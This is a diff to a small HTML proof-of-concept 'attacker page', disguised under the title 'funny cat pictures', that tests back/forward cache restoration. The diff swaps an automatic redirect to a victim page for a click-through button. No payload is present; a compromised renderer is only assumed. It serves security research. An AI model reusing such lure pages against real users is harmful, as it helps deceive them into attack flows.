@@ -1,3 +1,4 @@
+```html
 <!doctype html>
 <meta charset="utf-8">
 <title>funny cat pictures</title>
@@ -14,9 +15,12 @@
 <p>This is the attacker page (its renderer process is assumed compromised).</p>
 
 <p>
-  Navigating this tab to the victim in 3 seconds…
-  After navigation, this document may be stored in the back/forward cache.
+  Click the button to navigate to the victim page.
 </p>
+
+<button onclick="location.href='https://rhadityathinkpad-web.github.io/bfcache-poc/victim.html'">
+  Go to Victim
+</button>
 
 <h2>BFCache status</h2>
 <pre id="status">Waiting...</pre>
@@ -39,11 +43,5 @@ window.addEventListener("pageshow", event => {
     status.textContent =
         "pageshow\nBFCache restore: " + event.persisted;
 });
-
-setTimeout(() => {
-    console.log("[ATTACKER] Navigating to victim...");
-
-    location.href =
-        "https://rhadityathinkpad-web.github.io/bfcache-poc/victim.html";
-}, 3000);
 </script>
+```
